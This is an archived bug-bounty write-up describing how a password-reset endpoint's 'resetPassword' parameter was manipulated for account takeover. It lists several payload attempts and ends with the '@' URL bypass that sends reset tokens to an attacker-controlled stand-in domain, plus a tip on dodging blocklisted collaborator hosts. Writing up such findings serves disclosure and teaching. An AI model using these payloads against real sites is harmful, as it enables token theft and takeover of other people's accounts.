# Password Reset Link Injection Enables Full Account Takeover

- **Source URL:** https://medium.com/@mhmodgm54/password-reset-link-injection-enables-full-account-takeover-b0d3c38bcd5c?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905122413/https://medium.com/@mhmodgm54/password-reset-link-injection-enables-full-account-takeover-b0d3c38bcd5c
- **Fetched:** 2026-11-21
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10069 (id 10069)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Password Reset Link Injection Enables Full Account Takeover

## Introduction

In this write-up, I demonstrate how a weak password reset implementation in a web application (referred to as `target.com`) can lead to a **full account takeover (ATO)** with just a single click from the victim.

## Discovery Steps

While testing the password reset functionality on `target.com`, I noticed that the reset process begins with a request that checks if the email exists. If the email is valid, a second request is sent containing a parameter named `resetPassword`

By default, this parameter has a value such as:

`https://target.com/reset-password`
This value gets reflected in the reset link emailed to the user, appearing as

`https://target.com/reset-password?token=XYZ`
At this point, I think **What happens if I modify the resetPassword value to point to my own domain?**

## Bypassing Restrictions

1. **Initial Attempt:**
I replaced the entire value with my own domain:

`https://attacker-domain.com`
This returned a `403 Forbidden`, indicating some server-side validation was in place.

**2. Appending My Domain To Original Domain:**

I then tried:

`https://target.com/reset-password/attacker-domain.com`
This returned `200 OK`, but the reset link wasn’t redirected.

**3. Removing /reset-password:**

I tried:

`https://target.com/attacker-domain.com`
Still returned `200 OK`.

**4. Trying direct domain with /reset-password:**

`https://attacker-domain.com/reset-password`
Returned `403`, indicating `target.com` must appear in the link.

**5. Injecting target domain as a query param:**

`https://attacker-domain.com?p=target.com`
**Still** `403` **so now appear** target.com **must be in the link also in the first of the link**

**6. Final successful bypass using @ technique:**

I changed the value to:

`https://target.com@attacker-domain.com`
This worked — the reset link sent to the email was:

`https://attacker-domain.com?token=XYZ`
When the victim clicks this link, it sends the token to my domain, visible in my server logs now can take this token value and use it in the original reset password link and now can change user password

## Tips

don’t use Burp collaborator cause it now many developer but it in black list in my state i spent a lot of tries in bypass the response be 403 and then i discovered it cause burp collaborator link

*أن رجلا جاء إلى رسول الله صلى الله عليه وسلم فقال : ( يا رسول الله ! أيُّ الناس أحبُّ إلى الله ؟ فقال : أحبُّ الناس إلى الله أنفعهم للناس…)*
